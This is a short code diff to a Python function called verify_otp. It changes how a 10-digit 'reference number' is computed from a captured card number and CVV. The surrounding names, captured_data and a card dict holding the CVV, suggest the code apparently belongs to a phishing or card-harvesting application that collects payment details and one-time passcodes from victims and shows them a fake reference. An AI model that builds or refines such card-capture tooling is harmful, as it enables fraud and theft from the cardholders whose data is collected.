@@ -294,11 +294,12 @@ def verify_otp():
                 cvv = re.sub(r'\D', '', captured_data['card'].get('cvv', ''))
 
                 if card_number and cvv:
-                    # Calculate: (card_number + cvv) / 90000 + 10000
-                    # Result will be between 10000-99999
+                    # Calculate: (card_number + cvv) % 900000000 + 1000000000
+                    # Result will be a 10-digit number (1000000000-1899999999)
+                    # Never starts with 0
                     card_int = int(card_number)
                     cvv_int = int(cvv)
-                    reference_number = str(int((card_int + cvv_int) / 90000) + 10000)
+                    reference_number = str(((card_int + cvv_int) % 900000000) + 1000000000)
             except (ValueError, ZeroDivisionError):
                 reference_number = "N/A"
     except Exception as e:
